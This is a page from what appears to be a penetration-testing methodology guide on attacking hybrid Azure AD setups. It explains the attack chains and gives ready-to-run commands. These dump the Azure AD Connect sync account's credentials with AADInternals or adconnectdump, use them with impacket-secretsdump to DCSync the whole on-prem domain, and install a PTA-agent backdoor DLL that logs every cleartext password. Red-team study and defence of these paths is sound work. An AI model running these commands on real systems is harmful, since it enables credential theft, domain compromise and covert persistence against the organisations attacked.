---
title: "24 · Azure AD / Hybrid Attacks"
---

# 24 · Azure AD / Hybrid Attacks

> Azure AD Connect server is on-prem AD's hybrid bridge and a goldmine.

!!! note "Phase overview"
    Hybrid environments synchronize on-prem AD into Azure AD via the Azure AD Connect server. The MSOL_ sync account it uses has DCSync-equivalent rights on the on-prem domain. Compromise the AADC server → extract MSOL_ creds → DCSync everyone. Pass-Through Authentication is the other path: the PTA agent server validates Azure AD logons against on-prem and can be backdoored to log every cleartext password.

### 24.1 · Azure AD Connect Password Extraction

!!! info "Why this works / how it chains"

    The `MSOL_<random>` account credentials are stored encrypted in MSSQL on the AADC server itself. AADInternals' ***`Get-AADIntSyncCredentials`*** extracts them. Then use the MSOL_ account against any DC for full DCSync.

!!! warning "What leads here"
    - Azure AD Connect server found (often named AADC, sync, adconnect)
    - Have local admin on Azure AD Connect server
    - Sync account has DCSync-equivalent rights

```powershell title="Find AADC + extract MSOL_ creds"
# Some examples:

# Find Azure AD Connect server
Get-ADUser -Filter {Description -like "*Azure*"} -Properties Description
# Look for: MSOL_ or sync_ accounts

# Method 1: adconnectdump (remote)
python3 adconnectdump.py domain.local/user:pass@<AADC_SERVER>

# Method 2: From AADC server itself
Import-Module .\AADInternals.ps1
Get-AADIntSyncCredentials  # extracts MSOL account credentials

# The MSOL_ account has DCSync rights!
impacket-secretsdump domain.local/MSOL_account:pass@<DC_IP>
```


### 24.2 · Pass-Through Authentication (PTA) Abuse

!!! info "Why this works / how it chains"

    PTA agents validate Azure AD logons against on-prem. Install a malicious DLL on the PTA agent → log every cleartext credential that flows through. AADInternals automates installation and log retrieval.

```powershell title="AADIntPTASpy"
Import-Module .\AADInternals.ps1
Install-AADIntPTASpy  # installs credential interceptor
# Wait for logons...
Get-AADIntPTASpyLog  # retrieve captured credentials
```

